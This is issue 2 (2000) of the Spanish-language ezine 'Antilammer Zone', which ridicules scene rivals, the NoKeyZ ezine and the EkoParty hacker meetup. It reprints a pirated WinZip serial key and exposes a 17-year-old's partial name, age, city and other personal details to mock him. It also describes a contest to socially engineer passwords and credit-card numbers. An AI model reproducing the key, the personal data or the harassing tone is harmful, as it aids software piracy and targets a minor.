

             //      .
            //      / \
           //      /   \
          //      /     \
         //      /_______\_____
        //      /         \   /
   ====<<      /           \ /
        \\                  /
         \\               _/_ 
          \\              /
           \\            /
            \\          /_____________







                                                         A n t i l a m m e r   Z o n e   >-


                                                          " La pesadilla de los 'hackers' "




                                                                    Numero  2 >-< © 2000 >-

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

 -< Editor:
         -< EL_NONO <Argentina>

 -< Co-Editores, Co-Laboradores y Rompe-Co-Lones:
              -< Sherman <Argentina>
              -< NOEL173 <Uruguay>
              -< Gelsito <Argentina>
              -< Vaselin <Argentina>
              -< cARNIZA <Argentina>
              -< ELFeito <Argentina>
              -< Rubbish <Argentina>
              -< SNacKro <Colombia>
              -< XePTiCo <España> *

* XePTiCo habra sido raptado por una horda de gallegos lammers? Desaparecio completamente.

 -< Download from:
              -< http://antilammer.freehosting.net

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

   -< Temario General >-

  -< Lammers on IRC        >-< Tomando Canales >-
  -< Lammers on Internet   >-< Nukeando >-
  -< Lammers on Earth      >-< Diciendo "Soy Hacker" >-
  -< Lammers on Universe   >-< Provocando una verdadera superpoblacion de autenticos idiotas >-
  -< Lammers Everywhere    >-< Imitando a los Muertos Vivos >-

       "...no sabes, hasta hubo lammers que dijeron que eramos de la federal,
        alegando que az@uol.es es por Azules..." EL_NONO

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-



 -<  A n t i l a m m e r   Z o n e

    -< Indice >-
   -<##>-< Titulo                                                         >-<-<Autor>->-
   -<01.- Editorial, AZ lastima a los lammers                             >-< EL_NONO >-
   -<02.- Agradecimientos y Aclaraciones                                  >-< Sherman >-
   -<03.- NoKeyZ, lammers a lo grande                                     >-< Vaselin >-
   -<04.- El Perfil de un Lammer: POSEIDON                                >-< ELFeito >-
   -<05.- EkoParty, capture the flag (quake) o capture the channel (irc)? >-< cARNIZA >-
   -<06.- Antilammer Feedback, Seccion de Emails                          >-< Sherman >-
   -<07.- S_K (C) NH community 2000 Dept. de VIRII, como copiar mal a DaN >-< Vaselin >-
   -<08.- Lo que se dijo, Boards Comentadas                               >-< Sherman >-
   -<09.- Clarin, Informatica 2.0, "Dele de comer a los Lammers"          >-< Vaselin >-
   -<10.- NextVision, "Especialistas en Seguridad Informatica"            >-< Vaselin >-
   -<11.- CIA's Zines, Un denominador comun?                              >-< Gelsito >-
   -<12.- Kebracho Team, Grupo dedicado a ridiculizar a los de Ezkracho   >-< Sherman >-
   -<13.- Logs, "Lei, Rei y me Mee"                                       >-< Ustedes >-
   -<14.- Relatos de un Lanzamiento Agitado                               >-< Rubbish >-
   -<15.- unknowlammer.cjb.net, la gente responde                         >-< Gelsito >-
   -<16.- La Gran Verdad                                                  >-< NOEL173 >-
   -<17.- Mundo Lammer                                                    >-< NOEL173 >-

 -<  A n t i l a m m e r   Z o n e



-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<01>-


EDITORIAL, AZ lastima a los lammers >-

  Estamos muy contentos por el exito, ROTUNDO de az, devastador sin dudas, y espero que sirva
como presedente, para que los lammers piensen 2 veces las cosas antes de hacerlas.
  Mucha gente se sintio atacada, sin haberlos llamado lammers, y considero que estan comentiendo
un error al intentar leer mensajes entrelineas en textos como los nuestros, que poco mas y
gritan lo que quieren decir. No es el objetivo de az, hacer sentir perseguidos a los novatos ni
a los hackers mucho menos, solo intentamos borrar a los mogolicos que molestan continuamente,
lammers.
  Se que muchos de los que dicen, "oh que mal" en irc, al leerla bien que se rien, y quisieran
colaborar con az, asi que, por favor, ahorrense los insultos y limitense a no ser falsos.
  Espero que AZ2 les guste mas que AZ1, aunque es cierto que quizas este numero no pegue tanto
como el 1, y no tenga tanta promocion.
  Desde aqui, quiero agradecer a muchos amigos que me ayudaron, y que aunque no formen parte del
staff ni figuren aqui, me ayudaron a que se hiciera posible este ezine, sin siquiera haberla
leido y espero que no se hayan desilucionado, pues no he visto a ninguno desde que se edito la
numero 1.
  Desde AZ muchas gracias, y esperando que no haya mas AZ en el futuro por falta de material,
los dejo con el ezine.

...

<cARNIZA> che viejo, CAOS es conchetito no?
<Gelsito> no, es tonto no mas
<cARNIZA> y los del tablon de SET? se pensaron que yo le dije lammers
a los de SET y nada que ver, solo dije que eso me parecia muy lammer de
su parte, y que jamas me esperaba una cosa asi de ellos.
<cARNIZA> fijate "un grupo de hackers" dije, no de lammers
<Gelsito> y bueno, dejalos que malinterpreten, quizas leen de nuevo el
articulo y se dan cuenta
<ELFeito> callate cARNIZA, al menos a vos te respondieron, a mi que me
va a responder POSEIDON si debe estar muerto ya hehehe.
<cARNIZA> es verdad
<Gelsito> tuvimos mail de [Hellraiser] !!!
<ELFeito> y que dijo?
<Gelsito> nos puteo un poco el pendejo
<cARNIZA> ese puto de mierda puteandonos???
<cARNIZA> que no me lo cruce por la calle porque lo cago a saques
<Vaselin> muchachos, no se calienten con el lammer, es asi, es diez mil
veces preferible "ezkracharlo" en texto que meterle un par de ganchos.
<cARNIZA> ya se Vaselin, pero sabes como me gusta la sangre
<Vaselin> calmate queres, es un nene
<ELFeito> de Micro$oft encima!! disculpame Vaselin, pero quiero darle
una buena trompada en el medio de la jeta a ese pendejito lammer que se
dice gran hacker
<SNacKro> PEGALE UNA POR MI !!!
<Vaselin> che loco! ponganse las pilas, mira si le vas a ir a pegar a
un lammer. Por mas que sea un lammer olimpico, no podes pegarle por eso
<Vaselin> sientanse conformes, con todo lo que escribimos, el chabon no
tiene que aparecer de nuevo sobre la faz de la tierra
<EL_NONO> che salio la HEH! 2 !!! y la 3 !!!!!!!
<EL_NONO> que suerte, mas material para AZ 2 :)
<cARNIZA> no podes!!!!!!! como pueden ser tan hijos de puta esos giles!
<cARNIZA> no tienen un carajo de dignidad, ves porque quiero reventar
lammers Vaselin?
<Vaselin> vivis en una sociedad lammer, y no por eso te trompeas con el
primer gilun que se te cruza
<cARNIZA> que no!!
<Vaselin> si bueno pero calmate che
<Gelsito> che adonde jugamos esta semana? maldita promocion
<ELFeito> callense loco, que estamos haciendo el log para az 2 !
<EL_NONO> ya fue suficiente muchachos, ya esta

...

EL_NONO >-

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<02>-

  Agradecimientos y Aclaraciones >-

 Queremos agradecer a todos los que colaboraron para que AZ siga adelante. Como veran, este 
numero no es como lo fue el primero, principalmente esta compuesto por respuestas a comentarios,
a mails, y logs que nos enviaron. En pocas palabras, gran parte de este numero esta hecho por
ustedes, y a ustedes les agradecemos. No se tenia en mente la edicion de un numero 2, mas que
nada por falta de tiempo por parte de todos los que componen el equipo de AZ, pero de a poco se
pudo ir construyendo.
 Gracias a todos, y no bajen los brazos, keep on working for a lammer-free world.

Sherman.

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<03>-


 NoKeyZ, lammers a lo grande >-

    El dia 09/02/2000 salio esta e-zine que sorprendio a mas de uno, pero no por buena, sino por
lammer. Vean un pequeño resumen que hago mientras la leo, porque no puedo creer lo lammer que
muestran ser algunos de los que escriben para esta e-zine.

[NoKeyZ 1]

Eres presente del nuevo proyecto de un grupo de jovenes adiktos a la Seguridad Informatica 

[...]

se trata sin mas ni menos k de un nuevo e-zine en la escena under nacional y mundial si 
tal y como leiste, ///NoKeyZ e-zine\\\ no pretende ser un e-zine mas dentro de los 
tantos ya exsistentes si no k romperemos esa gruesa pared k selosamente separan a los
miembros principales de los lectores... nuestro objetivo mas k el de informar y mantener 
al tanto de todo lo k suceda en el mundo informatiko mundial sera sin lugar a dudas unir a 
todo ser k le interese por este mundo:
					
				"El mundo de la verdadera libertad"

[es que los comentarios sobran, quiero creer que estos nenes estaban fumados]

Todos los miembros estamos muy ansiosos por sacar este proyecto adelante sin duda nos 
marca de alguna u otra forma,hemos dedicado gran parte de nuestros valiosos tiempos 
para darles un ayuda a ustedes nuestros lectores ya k nuestro fin persigue ser una ayuda 
a quienes les interese la Seguridad Informatica. Desde luego nosotros dejamos de antemano 
muy claro k no sosmos "HACKERS" ya k muchos confunden un e-zine con un "grupo" de hackers!
y otros... desde luego partiremos con articulos un tanto basicos ("La escala se sube desde 
el principio") para luego poco a poco ir subiendo nuestro nivel aseptaremos todo tipo de 
criticas incluso esas desubicadas k lo encuentran todo malo...("Es facil desir k algo esta 
mal y no aser algo mejor") lema de algunos lamos! pero bueno ya no los lateamos mas y los 
invitamos a ser victimas de..... NoKeyZ e-zine.

[bien, aclaran que no son hackers, y ademas nos hacen referencia a nosotros!!! a AZ!!! y eso
que para el 09/02/2000 todabia no habia salido AZ!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
es que ahora todos dicen que nosotros somos malos y que decimos que todos son lammers, pero no
es asi, sepan entender y por favor lean, porque esta muy claro que los textos que hemos
criticado son de caracter lammer o forman parte de una actitud lammer de alguien que no lo es,
pero que contribuye con material para nosotros, tomennos como quieran, pero yo creo que venimos
siendo una especie de Perdona Nuestros Pecados (mil perdones a los de PNP por la comparacion)
del Under Informatico]

Te presentamos a quienes con mucho esfuerzo y dedicacion an sacado esto adelante se trata de:
	
			
Staff: -[B||os]--[Cyber]--[Reaven]--[ZoKRaM]--[AZEZINO]--[Nashugga]--[Corsario-X]-

[AZEZINO ????? AZ EZINE ????? este nene nos esta pidiendo a gritos que lo incluyamos en AZ]

					€€€€€€€€€€€€€€€€€€€€€
					€€  ¿UNDERGROUND?  €€   
					€€€€€€€€€€€€€€€€€€€€€ by ZoKRaM

[Todavia no se respondio esa pregunta ZoKRaM, sino vean lo que sigue]

Bueno bueno si estas aqui es por algo no pretendemos llenarte de interrogantes pero si 
hay algo k es basico y sè de muchos k andan por ahy ablando de lo under y otras tantas 
weas pero lamentablemete no saben nada de nada, aun k  realmente no todos lo sabe y lo k 
es mas lo confunden con hacking y otras hiervas k porsupuesto tienen relacion pero no por 
eso son lo mismo entonses:

Informacion Underground significa en castellano "lo que nose deberia saber" (ya que 
puede causar conmocion popular o porque el mal uso de esa informacion puede llegar a 
causar problemas). La traduccion de Underground es "debajo de la tierra". Y toda la 
la informacion k se encuentra en este ambiente es es cubierta por el Gobierno, el 
Estado mismo y el SIDE, la NASA, el FBI (Federal Bureau of Investigation), la CIA, 
la KGB, la DEA (Drug Enforcement Agency), el Servicio Secreto de EEUU, los medios 
masivos de comunicacion, la Policia, los Bancos, los supuestos expertos en seguridad 
informatica, y todo aquel que esta en contra del libre flujo de "todo tipo" de informacion.

[Para para, frena pepe frena. Vamos por partes, primero esta frase que merece formar parte de
algo asi como las Lammer Frases, y si fuera un ranking, estaria muy pero muy bien posicionada:


 Informacion Underground significa en castellano "lo que nose deberia saber"

                                                    - ZoKRaM

cuando decis "el SIDE", te referis al lamme team???]

   Entonses como resumen, el Hacking, Phreaking, Carding, Cracking, Crashing, el Warez, 
la Anarquia, el Lockpicking, el Virucking o Viriing, el como fabricar drogas o como 
conseguirlas, la Magia Negra, la informacion robada que compromete a cientos de personas 
y agencias (como el caso de el "grupo" CHAOS que robo unos datos confidenciales del 
desastre de Chernobyl y los publico), informacion sobre los Ovnis o lugares secretos 
(Area 51? ba! pura mierda!), seria entonses todas las formas posibles imposibles havidas 
y por haver en k la tecnologia es usada! "indebidamente" tambien todo aquello k por 
rasones extrañas...no se deverian saber, datos k los clasifican como confidensiales y 
otras tantas escusas k el gobierno da, todo esto cae dentro del saco de lo UNDERGROUND.

["el Virucking o Viriing", esto da realmente pena, pero saben que, muchos "expertos" de seguridad
informatica, hackers y otros, no saben ni siquiera escribir correctamente Viruking, inventaron
durante años, cosas como ViruCking, Viriing, Vircing, y otras anomalias que no hacen mas que
evidenciar la falta de conocimiento en ese campo, he odio decir de ellos, "un com infector es
refacil de hacer" y les he propuesto que lo hagan, o que me digan como estaba estructurado al
menos el algoritmo de infeccion para dicho tipo de archivo, y solo obtuve una respuesta que se
asemejaba a un algoritmo de un com overwritter muy vago, pero del resto de los "expertos" de la
seguridad informatica, nada, excusas, y hasta acusaciones, diciendo que los virukers son todos
unos delincuentes, eso de parte de "HACKERS". Realmente lapidario.]


[A continuacion venia un articulo sobre Hacking en Windows, de parte de Corsario-X, pero me
aburrio tanto pero tanto que me dormi. Recuerdo que escribio algo sobre jugar rol pero la verdad
el pibe esta para otra y no para escribir un articulo de Hacking]

					€€€€€€€€€€€€€€€€€
					€€   Serialz   €€
					€€€€€€€€€€€€€€€€€ by Reaven

[Si, si estan pensando en que Reaven hizo copy y paste de un monton de Serialz, asi es. Lo mas
chistoso, es que como otras zines, lammes en eso, usaban un KeyGen que algun cracker con mucho
esfuerzo hizo, para que??, para poner el nombre de la zine y generar el serial, y luego mandarlo
a la lista, un asco, miren]

WinZip v7.0 :name/NoKeyZ WinZip:E05305DA/ Winzip Self-extractor : 239945

[horripilante]

					€€€€€€€€€€€€€€€
					€€    PGP    €€
					€€€€€€€€€€€€€€€ by ZoKRaM

[Luego de un par de idioteces que copia de algun lado...]

Pretty Good(mr) Privacy (PGP), "intimidad bastante buena", de Phil's Pretty Good 
Software, es una aplikaci¢n inform tika de kriptograf¡a de alta seguridad para MSDOS,
Unix, VAX/VMS y otros ordenadores.

["MSDOS, Unix, VAX/VMS y otros ordenadores.", esta vez si fui malo X-D]

[Luego de articulos de Reaven y AZEZINO que no revisten nada fuera del bajo nivel de la e-zine,
lluege a un articulo que me paralizo por completo. Al leer el titulo en el indice no cai a que
se referia CrackVirii, inoscente de mi, pense que era algo sobre Cracking y Viruking, que por
compartir el assembler en algunas areas, muchos hacen articulos refiriendose a ambas actividades
que distan completamente de ser iguales. El articulo es vomitivo, y me enferma por demas]

					€€€€€€€€€€€€€
					€€  Virii  €€             
					€€€€€€€€€€€€€ by b||os

[El articulo trata de como hacer virii hacks, cambiandoles el nombre del autor o otras strings
que muestra el virus... Que patetico, que lammer por dios y la virgen santa!!! En una parte
b||os dice, acerca del fake host, dummie o bait que hay que crear para dejar el virus en bolas:]

Un archivo COM que haremos nosotros mismos.

[ahora yo me pregunto, ya que sos tan piola como para cambiar el nombre del creador de una obra,
porque no creas tu propia obra? LAMMER!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]

[alto! recuerdo la SET 12, Articulo 6... que se extendio en la 13 y 14...

                Curso Basico-Practico de CRACKEO de VIRUS
                         todo en uno se¤ora!!
                            @97 by +NetBuL


  /-------------------------------------------------------------
  |IMPORTANTE:                                                 |
  |.- Nivel: baaaasico (practicamente "explicado para tontos") |
  |.- Indicado para: novatos y lamercillos ocasionales ...     |
  -------------------------------------------------------------/

aja! asi de aqui se inspiro este tal B||os!... bueno, para que luego las niñas no lloren, voy a
continuar con esta bosta de B||os...]

Por ultimo, recuerda, si cagay tu PC, culpa mia no fue, para criticas, sugerencias, 
comentarios, putadas y todo eso, emailme a bioscrack@hotmail.com o busquenme en #Virus, 
del irc.terra.cl.

[por favor, no permitan que estos lammers se sigan dispersando, no los apoyen, no se junten con
ellos, insultenlos si quieren, no se, pero por favor no hagan que este tipo de aberraciones
contra verdaderos programadores sigan ocurriendo. Puteenlo de mi parte por favor]

[mejor paso al proximo articulo porque estoy muy enojado con este lammer de b||os]

					€€€€€€€€€€€€€€€€€
					€€    Linux    €€
					€€€€€€€€€€€€€€€€€ by Cyber
						
Hola, primero que nada quiero decirles que no soy muy experto en esto de linux, 
solo les voy a tratar de explicar lo que yo se, acerca del mejor sistema operativo 
que existe.

[che cyber, si no sabes mucho de linux, porque decis que es el mejor sistema operativo que
existe? sera porque todos dicen lo mismo, y los lammers repiten como idiotas o no? quizas yo
este equivocado]

[mas articulos, de Corsario-X, Nashugga y Reaven, que no revisten importancia alguna, son
totalmente insipidos, no existen]

                              €€€€€€€€€€€€€€€€
                              €€  Noticias  €€
                              €€€€€€€€€€€€€€€€ by NoKeyZ


Amedida k salgan noticias relevantes para nuestro mundo nos encargaremos nosotros de 
mantenerte al tanto de ellas por el momento no son muchas, por esto tomamos algunas
noticias del gran grupo mexicano Raza-Mexicana, GraXias hermananos

[se chafaron las noticias de Raza-Mexicana porque no son capaces de buscar uds mismos las news,
dan lastima chabones, no se dan cuenta de eso?, y un poco mas y se dicen los mejores, que
lammers estos salames]

					€€€€€€€€€€€€€€€€€
					€€  Despedida  €€
					€€€€€€€€€€€€€€€€€ by NoKeyZ

[por fin!]
	
Bueno lamentablemete este momento tendria k llegar, estamos tremendamente contentos por 
aver sacado nuestro primer numero sin duda k es un gran logro y algo k nos marcaran, 
hemos estado weando tanto con el e-zine k el ritmo ya lo tomanmos y solo queremos sacar 
el segundo numero pero trankilos k ya biene..., hemos de esperar k los temas tratados 
ayan sido de tu agrado y mas k agrado de tu utilidad sacale el maximo de provecho por 
el momento y como te abras dado cuenta son articulos basicos si tienes algo con k aportar 
criticar o symplemente tienes agluna maldita duada k no te deja dormir en paz no dudez 
en buzcarnos estamos en el IRC en Terra #CyberHack te esperamos........ ha! y recuerda 
siempre esto:


		"Aprender sin pensar es tiempo perdido, pensar sin aprender es peligroso!"
									by ZoKRaM.


HASTA LA PROXIMA BYE.......... 

[...]


Vaselin; "comprate un tarro porque aca llegue yo"

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<04>-

  El Perfil de un Lammer: POSEIDON >-

  Tuve suerte, no tuve que trabajar, todo esta en su site, el site de la tecno-zine, el site del
"Caballero de la RED" como le gustaba que le dijeran.

[...]

Nombre: D.S. Enzo Javier.

[horrendo, como vas a dar tu nombre, o tus iniciales??? solo siendo un lammer o tal vez un mero
scripter que se dice hacker.]

Edad: 17 años.

[era de suponer..]

Cumple: 16 de enero (acepto regalos)

[mas data, por favor, dame mas data!]

Altura: 1,69 aprox.

[gracias.]

Peso: 67,30kg.

[data adicional, que bien! :)]

Ciudad: Berisso.

[ciudad?]

Calzado Nro.: 40, 41.

[es un zapato, no hay nada que hacerle.]

Novia: Si, Dianita ;) (lo siento chicas jajaja)

[Dianita, de vocacion enfermera y maestra jardinera, porque solo una asi puede cuidar de este
niño enfermo.]

Mejor amigo: Zor[k]roZ

[mmm mepa que es el amigo invisible..]

[...de terror]

  Adjunto la foto que tambien esta en su site, para que lo conozcan, y si lo ven en la calle,
felicitenlo por haberse ido antes que az apareciere. :)

-= ELFeito =- El Hilo de la RED.

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<05>-

  EkoParty, capture the flag (quake) o capture the chan (irc) ? >-

[..]

No te lo podes perder ..

[az no se lo puede perder ..]

[..]

http://www.ezkracho.com.ar/ekoparty/


Un 18 de Junio de 1999 nace oficialmente el Ezkracho Team, mas alla de que tenga una historia
mucho mas larga.. Dentro de unos meses vamos a cumplir 1 año de existencia para bien o mal de
muchos, y por supuesto lo pensamos festejar a lo grande. Y este evento se va a llamar:
EkoParty !!  

[NOTA: este articulo fue confeccionado antes de realizarse la EkoParty. No obstante AZ estuvo
presente y se le agregaron un par de cositas ;)
Con respecto a la EkoParty en si, les aseguro que fue mas trucha de lo que se esperaba...]

Qué es la EkoParty ? 
Cuando es y en donde ? 
Cuanto sale la entrada ? 
Que nos ofrece el lugar ? 
Eventos a realizarse 
Qué tengo que hacer para poder asistir ? 
Y a mi PC no le va a pasar nada ?  


Qué es la EkoParty ?  

[LA conferencia/reunion/meeting lammer argentina.]

La EkoParty es una reunion que se realizará a fines de Junio o comienzos de Julio y consiste en
una LAN de 48hs. en las que habrá todo tipo de eventos y premios. Estan invitados todos a los que
les apasione la informática y en especial la seguridad, y será una ocasion importante en la que
se podrá conocer a todos los que comparten nuestros mismos intereses o que nunca pudimos conocer
en persona.

[eso!!! conozcan en persona a estos lammers!!!, chicos de ezkracho, no se preocupen que no va a
ir la federal para nada, porque uds no son peligrosos para nada... salvo jugando al quake!]

La idea es que todos los que asistan se queden las 48hs. y por supuesto que lleven su PC ya sea
para jugar, leechear o compartir info. Para asistir se deberá pagar una entrada para pagar el
local donde se realizará la party pero queremos aclarar que todo el dinero recaudado queda en
manos de los dueños del lugar en donde haremos el evento, y que nosotros lo organizamos
totalmente sin fines de lucro.  


Cuando es y en donde ?  

[ah no, no te digo donde es porque es solo para eleets.]

La EkoParty se va a realizar desde el Viernes 30 de Junio a la noche hasta el Domingo 2 de Julio
al mediodía; seráa aproximadamente 48hs de LAN y mucho mas!
El lugar será en la BairesLan un local totalmente equipado que se dedica a hacer LAN's; la
dirección no se hará publica, se dara unicamente via mail a los que nos hayan confirmado que
venían. Pero para que tengan una idea esta a 20 minutos del Obelisco en auto.  


Cuanto sale la entrada ?  

[ah no te dijeron? te pagan para ir..]

Ante todo quiero aclarar que la entrada es unicamente para pagar el local, osea que todo el
dinero recaudado va directamente a los due~os de la BairesLan y Ezkracho organiza esto totalmente
sin fines de lucro.
Hay dos precios, para la gente que vaya con computadora sale $8 y para la gente que vaya sin
computadora sale $3, si la gente que va sin computadora se pone a usar la compuatdora de uno que
si haya llevado pasa a pagar $5, todos los asistentes pagando la entrada tienen una latita de
gaseosa, esto es lo que me comunicaron los due~os de la BairesLan.
 

Que nos ofrece el lugar ?  

[un ambiente deplorable repleto de lammers sedientos de contar sus hazañas tomando canales,
nukeando y sobre todo, formateando hds de los pobres giles de los usuarios ignorantes con
recursos compartidos.]

En la BairesLan vamos a encontrar una LAN conectada totalmente con un switch 10/100 y no se usa
ningun HUB, por lo que la red vuela. Vamos a tener acceso a Internet continuo. Hay un telefono
para pedir remises, taxis o avisar que te vengan a buscar. Hay una pieza con varios colchones
para que si estas destruido te acuestes unas horas a dormir. Hay heladera.
Y creo que lo principal es eso.. lo mas importante es que cuando traigan su PC no tienen que
traer cables de red ni nada por el estilo eso ya esta todo cibierto. haa, cada persona con PC va
a tener una silla con una mesa de 1 metro de espacio con la boca de red, instalacion electrica,
todo...  


Eventos a realizarse  

Hack Challenge: Durante los dos días del evento estarán on-line para toda la red interna (no se
descarta que tambien para Inet), dos servidores corriendo Linux y Windows NT montados por
Ezkracho. El desafío consiste en ser el primero en hackear la página web de cualquiera de cada
uno de los servidores; el ganador se llevará un premio especial.  

[el premio especial es una remera del ezkracho team autografiada por todos sus integrantes...
ellos son grandes estrellas por eso...]

Campeonato de Quake: En cada uno de los dos días se organizará un campeonato oficial de Quake,
que estará organizado por Cinic[LOD] (www.lod.com.ar/cinic). Para este campeonato se montará un
servidor dedicado de Quake bajo Linux, a cargo de XXX[LOD] el administrador del servidor de Quake
del ISP "Argentina On Line" (quake.ba.net). Habrá Capture the flag, Arena y por supuesto
DeathMatch!
Y no se descarta un "Clan LOD vs. EkoParty", si los chicos se animan claro... ;)  

[totalmente clasico en las reuniones de estos quakeros... perdon, "hackers".]
  
Presentación oficial del ASSHOLE: Se hará la presentación oficial del ASSHOLE, el troyano de
Ezkracho, dicha presentación la harán [Hellraiser] y ]-[eavy, sus programadores. Se mostrará su
funcionamiento y características.  

[grandes valores del "hacking" argentino, reunen grandes cualidades. Contando solo a [Hellraiser]
ya tenes items como scripting, visual basic, nukes, linux y pedanteria.]
  
Trivial Hacker: Este será un concurso que consistirá en una competencia entre varios grupos que
deberan responder preguntas de diversos temas de seguridad, informática y afines. A cada pregunta
correcta se sumarán puntos y cada incorrecta se restaran. Todos los que deseen participar pueden
forma su grupo 1 hora antes del concurso.  

[y cuadernos para colorear no hay? asi [Hellraiser] puede pintarse a el mismo que ocupe toda una
hoja y al lado una pc con linux y visual basic para linux!!! (aclaracion para lammers: VB para
linux solo existe en la mente (cual mente?) de [Hellraiser] y no esta disponible en el mundo
real por el momento, pero hay chances que HellSoft saque una version cuando su dueño aprenda a
programar. Fecha aprox. de salida Enero del 5500 d.c. si es que en los proximos 50 años
descubren como hacer inmortal a un ser humano... o en este caso a los hominidos)]
  
Exposiciones sobre seguridad y afines: En determinados horarios programados en ambos días, varios
disertantes expondrán para todos los asistentes una charla sobre diferentes temas de la seguridad
y de la informática en general. Les pedimos que todos los que deseen exponer un tema nos lo hagan
saber lo mas pronto posible. Hasta ahora ya tenemos varios disertantes confirmados pero
preferimos publicarlo cuando ya tengamos el cronograma de los dos días finalizado.  

["una charla sobre diferentes temas de la seguridad"... chicos salgan abrigados y miren antes de
cruzar la calle..."y de la informática en general"... Curso de Excel en vivo, si!! gratis!! y de
regalo, y por ser la EkoParty, Como configurar el config.sys...]
  
IS in LIVE: Ingeniería social en vivo, este es un concurso en que daremos a todos los que se
animen un número de telefono con un nombre de una persona y el desafío es conseguir un pass de
Inet, el numero de DNI o el numero de la tarjeta de credito, etc.. habra distintos tipos de
dificultad. Esto es solo para probar la IS y sin otro fin.  

[pueden ser tan pero tan estupidos como para hacer un concurso de IS????? claro que si, la
idiotez de los lammers argentinos no tiene limites.]
  
Hack in LIVE: Un colega muy conocido del ambiente del cual por ahora preferimos resguardar su
identidad, se ofreció a hackear un servidor muy conocido en vivo, obviamente solo para demostrar
y explicar las fallas de seguridad del mismo.  

["Un colega muy conocido del ambiente del cual por ahora preferimos resguardar su identidad"...
porque no saben a quien llamar, caraduras...]

Qué tengo que hacer para poder asistir ?  

[con ser lammer entras de una.]

Para asistir SI o SI me lo tienen que confirmar vía mail, cualquiera que quiera ir si no esta en
la lista que estamos armando no podrá ingresar. Si bien la EkoParty es pública debemos tomar
ciertos recaudos sobre los asistentes por razones de seguridad; osea que si van me mandan el mail
avisandome y si yo o alguno de Ezkracho los conoce todo bien, ahora si no los conocemos digannos
de quien son amigos que nosotros conozcamos para poder obtener referencias suyas. Es medio
molesto todo esto pero es para asegurar que los que asistan sean personas que les interese el
evento, y para resguardar la seguridad de todos los presentes y de sus respectivos equipos.
Para confirmar la presencia escriban a caos@ezkracho.com.ar  


Y a mi PC no le va a pasar nada ?  

[no gil, preocupate por tu cerebro, que te lo van a destruir estos idiotas.]

El lugar donde se realizará la EkoParty es un lugar que se dedica exclusivamente a realizar
eventos muy parecidos al de la Party en el que hay que llevar la PC para la LAN, por lo que ya
tienen una política de seguridad armada y una metodología de trabajo desarrollada.
Para comentarles algo el evento será a "Puertas Cerradas" por lo que solo se permite el ingreso
de personas con o sin PC en horarios establecidos, y por supuesto que si no estan en la lista que
armamos y no los conoce nadie no van a entrar.
En el lugar donde se hace la LAN durante la 48hs. habrá un guardia de seguridad privado y por
supuesto armado resguardando tanto la seguridad de los presentes como de sus equipos (para esto
sirve tambien el pago de la entrada). Tambien el lugar tiene arreglado con la policía de la zona
local para que durante las 48hs. de la LAN pase un patrullero mas seguido que de costumbre, pero
quedense tranquilos que no saben que se hace adentro ;)
Estas son solo algunos de los recaudos que se van a tomar para la seguridad de los equipos,
cualquier consulta no duden en preguntarme.  


                                           cARNIZA

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<06>-

  Antilammer Feedback, Seccion de Emails >-

 Bienvenidos a esta seccion, donde expondremos los mails recibidos, haciendo las correspondientes
